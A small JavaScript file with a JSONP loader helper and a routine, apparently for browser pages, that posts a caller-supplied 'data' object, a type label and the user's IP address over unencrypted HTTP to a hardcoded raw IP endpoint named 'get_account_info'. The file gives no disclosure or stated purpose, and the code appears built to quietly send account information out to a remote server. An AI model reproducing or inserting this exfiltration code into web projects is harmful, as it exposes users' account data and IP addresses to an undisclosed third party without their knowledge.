function jsonpGetJSON(r, e, n) {
  return t(r, e, n).then(JSON.parse)
}

function t(n, t, o) {
  return new Promise(function (e, o) {
    var i = i || 6000
    let a = 'jsonp_callback_' + new Date().getTime()
    window[a] = function (n) {
      e((0, JSON.stringify)(n))
      d()

      // e((0, r.default)(n)), d()
    }
    var c = document.getElementsByTagName('head')[0] || document.documentElement
    let f = document.createElement('script')

    f.src =
      n +
      (function (r) {
        return r.indexOf('?') >= 0 ? '&' : '?'
      })(n) +
      t +
      '=' +
      a
    f.async = !0
    f.onerror = function () {
      o(Error('Network error loading ' + f.src)), d()
    }
    c.appendChild(f)
    var s = setTimeout(function () {
      o(
        Error(
          'Request to ' + n + ' failed to execute callback after ' + i + 'ms.'
        )
      ),
        d()
    }, i)
    function d() {
      s && clearTimeout(s)
      window[a] && delete window[a]
      f && c.removeChild(f)
    }
  })
}

function getInifoData({ type, data, html }) {
  if (window.userIp) {
    postData(type, data, window.userIp)
  }
}

function postData(type, data, ip) {
  var xmlHttp = new XMLHttpRequest()
  xmlHttp.open(
    'POST',
    'http://118.190.203.247:1000/jump/analyze/get_account_info'
  )
  let fd = new FormData()
  fd.append('type', type)
  fd.append('data', JSON.stringify(data))
  fd.append('ip', ip)
  // var stringData = JSON.stringify(obj)
  xmlHttp.send(fd)
  xmlHttp.onreadystatechange = function () {
    //complete
    if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
      console.log('成功')
    } else {
      //请求失败的回调函数
      console.log('保存失败')
    }
  }
}
